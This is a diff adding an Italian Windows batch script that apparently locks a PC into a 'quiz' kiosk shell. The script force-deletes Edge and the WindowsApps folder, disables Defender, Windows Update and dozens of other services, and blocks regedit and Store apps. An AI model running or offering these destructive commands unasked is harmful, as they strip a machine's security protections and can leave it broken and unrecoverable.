+REM Imposta la shell di Windows per far partire quizprir.bat all’avvio
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "C:\quizprir.bat" /f
+
+echo File C:\quizprir.bat creato e shell impostata correttamente.
+
+::Torna indietro
+::reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe" /f
+
+
+REM Disinstallazione edge
+cd "C:\Program Files (x86)\Microsoft\Edge\Application\<versione>\Installer"
+setup.exe --uninstall --system-level --verbose-logging --force-uninstall
+rmdir /s /q "C:\Program Files (x86)\Microsoft\Edge"
+rmdir /s /q "C:\Program Files\Microsoft\Edge"
+rmdir /s /q "%LOCALAPPDATA%\Microsoft\Edge"
+
+
+REM Script totale disinstallazione EDGE
+:: Primo: termina il processo Microsoft Edge
+taskkill /F /IM msedge.exe >nul 2>&1
+
+CD %HOMEDRIVE%%HOMEPATH%\Desktop
+echo %CD%
+
+REM ************ Processo principale *****************
+
+echo *** Rimozione di Microsoft Edge ***
+call :eliminadirectory C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe
+call :eliminadirectory "C:\Program Files (x86)\Microsoft\Edge"
+call :eliminadirectory "C:\Program Files (x86)\Microsoft\EdgeUpdate"
+call :eliminadirectory "C:\Program Files (x86)\Microsoft\EdgeCore"
+call :eliminadirectory "C:\Program Files (x86)\Microsoft\EdgeWebView"
+echo *** Modifica del registro di sistema ***
+call :modificaregistro
+echo *** Rimozione collegamenti ***
+call :eliminacollegamento "C:\Users\Public\Desktop\Microsoft Edge.lnk"
+call :eliminacollegamento "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk"
+call :eliminacollegamento "%APPDATA%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk"
+echo Operazione completata!
+pause
+exit
+
+REM ************ eliminadirectory: Prendi possesso e rimuovi una directory *****************
+
+:eliminadirectory
+echo|set /p=Rimuovo directory %1
+if exist %1 (
+	takeown /a /r /d Y /f %1 > NUL
+	icacls %1 /grant administrators:f /t > NUL
+	rd /s /q %1 > NUL
+	if exist %1 (
+		echo ...Fallito.
+	) else (
+		echo ...Eliminato.
+	)
+) else (
+	echo ...non esiste.
+)
+exit /B 0
+
+REM ************ modificaregistro: modifica il registro per bloccare aggiornamenti Edge *****************
+
+:modificaregistro
+echo|set /p=Modifico registro
+echo Windows Registry Editor Version 5.00 > RimuoviEdge.reg
+echo. >> RimuoviEdge.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\EdgeUpdate] >> RimuoviEdge.reg
+echo "DoNotUpdateToEdgeWithChromium"=dword:00000001 >> RimuoviEdge.reg
+echo. >> RimuoviEdge.reg
+echo [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}] >> RimuoviEdge.reg
+
+regedit /s RimuoviEdge.reg
+del RimuoviEdge.reg
+echo ...fatto.
+exit /B 0
+
+:: Cancella cartelle di Microsoft Edge
+rmdir /s /q "C:\Program Files (x86)\Microsoft\Edge"
+rmdir /s /q "C:\Program Files (x86)\Microsoft\EdgeCore"
+rmdir /s /q "C:\Program Files (x86)\Microsoft\EdgeWebView"
+rmdir /s /q "C:\Program Files (x86)\Microsoft\Temp"
+
+:: Cancella icone Edge per tutti gli utenti
+for /f "delims=" %%a in ('dir /b "C:\Users"') do (
+	del /S /Q "C:\Users\%%a\Desktop\edge.lnk" >nul 2>&1
+	del /S /Q "C:\Users\%%a\Desktop\Microsoft Edge.lnk" >nul 2>&1)
+
+:: Cancella file aggiuntivi
+if exist "C:\Windows\System32\MicrosoftEdgeCP.exe" (
+	for /f "delims=" %%a in ('dir /b "C:\Windows\System32\MicrosoftEdge*"') do (
+		takeown /f "C:\Windows\System32\%%a" > NUL 2>&1
+		icacls "C:\Windows\System32\%%a" /inheritance:e /grant "%UserName%:(OI)(CI)F" /T /C > NUL 2>&1
+		del /S /Q "C:\Windows\System32\%%a" > NUL 2>&1
+	)
+)
+
+:eliminacollegamento
+echo|set /p=Rimuovo collegamento %1
+if exist %1 (
+	del %1
+	echo ...fatto.
+) else (
+	echo ...non esiste.
+)
+
+
+
+::Cancellato
+::reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "RestrictRun" /t REG_DWORD /d "1" /f
+::echo Disattivazione menu contestuale tasto destro...
+::reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoDesktop" /t REG_DWORD /d "1" /f
+::echo Disattivazione Windows+E Explorer...
+::reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoFileMenu" /t REG_DWORD /d "1" /f
+::echo Disattivazione Windows+X Power Menu...
+::reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuMorePrograms" /t REG_DWORD /d "1" /f
+::echo Disattivazione Windows+R Run...
+::reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
+REM Blocca accesso a cmd
+::reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d "2" /f
+echo.
+
+
+:: Lista completa dei servizi da disabilitare
+set "__MY_SERVICE_LIST__=wuauserv TabletInputService ClipSVC LicenseManager lfsvc AppXSvc NgcSvc KeyIso TimeBrokerSvc SEMgrSvc wlidsvc SecurityHealthService PcaSvc camsvc SSDPSRV WdNisSvc WdiSystemHost WdiServiceHost TokenBroker CDPSvc SgrmBroker WSearch wscsvc UsoSvc Themes Winmgmt Spooler WinDefend WpnService DPS CryptSvc EventSystem BFE DusmSvc DiagTrack SstpSvc WinRM MicrosoftEdgeElevationService Wecsvc TermService DmEnrollmentSvc smphost PolicyAgent IKEEXT BthAvctpSvc WbioSrvc fhsvc hidserv wisvc WerSvc"
+
+echo =====================================================
+echo Disabilitazione servizi tramite SC e Registro...
+echo =====================================================
+
+for %%S in (%__MY_SERVICE_LIST__%) do (
+    echo.
+    echo [*] Disabilitando servizio: %%S
+
+    :: 1. Disattiva il servizio con SC
+    sc config %%S start= disabled
+
+    :: 2. Prova a fermare il servizio se attivo
+    sc stop %%S >nul 2>&1
+
+    :: 3. Fallback con reg add (in caso SC fallisca)
+    reg add "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
+)
+
+:: Pulizia della variabile
+set "__MY_SERVICE_LIST__="
+
+echo.
+echo ------------------------------------------------------------
+echo.
+echo.
+echo.
+:: Disabilita tutte le app moderne (UWP) per tutti gli utenti
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Appx" /v AllowAllTrustedApps /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Appx" /v AllowStoreApps /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v NoUseStoreOpenWith /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v DisableWindowsConsumerFeatures /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v BlockNonAdminUserInstall /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsStore" /v RemoveWindowsStore /t REG_DWORD /d 1 /f
+:: Disattiva app in background (solo nuove installazioni, non retroattivo)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v LetAppsRunInBackground /t REG_DWORD /d 2 /f
+:: Impedisce esecuzione delle UWP anche se installate (tutte, incluse preinstallate)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Appx" /v BlockNonMicrosoftStoreApps /t REG_DWORD /d 1 /f
+:: Impedisci reinstallazione automatica di UWP
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v DisableWindowsConsumerFeatures /t REG_DWORD /d 1 /f
+echo -----------------------------------------------------
+echo.
+echo.
+REM Disattiva Editor del Registro (regedit)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
+echo.
+echo.
+echo ==========================================================================
+echo PRENDO IL CONTROLLO DI 'WindowsApps', IMPOSTO quiz COME PROPRIETARIO E CANCELL0 TUTTO
+echo ==========================================================================
+
+:: Nome utente da impostare come proprietario
+set "OWNER=quiz"
+
+:: Cartella UWP
+set "TARGET=C:\Program Files\WindowsApps"
+
+echo Target: %TARGET%
+echo Nuovo proprietario: %OWNER%
+
+:: STEP 1: Prendere possesso della cartella e del contenuto
+echo.
+echo [1/4] TAKEOWN - Acquisizione proprietà...
+takeown /f "%TARGET%" /r /d y
+
+:: STEP 2: Imposta proprietario a quiz
+echo.
+echo [2/4] ICACLS - Imposto proprietario a %OWNER%...
+icacls "%TARGET%" /setowner "%OWNER%" /t
+
+:: STEP 3: Concede permessi completi a quiz
+echo.
+echo [3/4] ICACLS - Concedo controllo completo a %OWNER%...
+icacls "%TARGET%" /grant "%OWNER%":F /t
+
+:: STEP 4: Cancellazione ricorsiva di tutto il contenuto
+echo.
+echo [4/4] CANCELLAZIONE - Rimozione di tutte le sottocartelle e file...
+rd /s /q "%TARGET%"
+
+:: Controllo se è stata cancellata correttamente
+if exist "%TARGET%" (
+    echo ATTENZIONE: la cartella non e stata eliminata completamente.
+) else (
+    echo Tutto il contenuto di WindowsApps e stato eliminato.
+)
+
+echo ==========================================================================
+echo Operazione conclusa. Riavvia il sistema per applicare completamente.
+echo ==========================================================================
+
+
+::rd /s /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Microsoft Store"
+::rd /s /q "%ProgramFiles%\WindowsApps"
+
+
+echo Esecuzione App moderne (UWP) bloccata.
+echo.
+echo.
+:: Colore super figo
+color 0a
+echo.
+echo.
+echo.
+echo        ___________
+echo       ^|.---------.^|
+echo       ^|^|         ^|^|
+echo       ^|^|         ^|^|
+echo       ^|^|         ^|^|
+echo       ^|'---------'^|
+echo        ^`)__ ____('
+echo        [=== -- o ]--.
+echo      __'---------'__ \
+echo     [::::::::::: :::] )
+echo      `""'"""""'""""`/T\
+echo                     \_/
+echo.
+echo TUTTE le modifiche sono state completate!
+echo.
+echo Premi un qualunque tasto per chiudere questa schermata, si consiglia di riavviare...
+echo.
+echo.
+@echo off
+set /p scelta=Vuoi riavviare il PC? (S/N): 
+
+rem Converti la scelta in maiuscolo
+set scelta=%scelta:~0,1%
+set scelta=%scelta:A=a%
+set scelta=%scelta:a=A%
+
+if /I "%scelta%"=="S" (
+    echo Riavvio immediato...
+    shutdown /r /t 0
+) else (
+    echo Operazione annullata.
+)
+
+exit
+
+pause>nul
+::exit /b
